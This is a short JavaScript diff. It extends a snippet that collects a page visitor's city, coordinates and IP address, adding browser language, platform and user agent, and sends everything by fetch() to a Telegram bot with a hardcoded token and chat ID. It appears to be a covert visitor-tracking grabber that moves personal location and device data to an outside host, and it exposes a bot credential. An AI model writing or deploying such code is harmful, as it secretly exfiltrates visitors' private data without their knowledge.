@@ -6,7 +6,11 @@
         city:location.city,
         latitude:location.latitude,
         longitudine:location.longitude,
-        ip:location.IPv4}
+        ip:location.IPv4,
+        Browserlanguage:navigator.browserLanguage,
+        language:navigator.language,
+        platform:navigator.platform,
+        UserAgent:navigator.userAgent}
         var res = encodeURI(JSON.stringify(obj));
         fetch(
         'https://api.telegram.org/bot1001037417:AAHZzKVs2KUzKXl-HvZYR7lKs35e6ShWw5I/sendMessage?chat_id=22734488&text='+res)
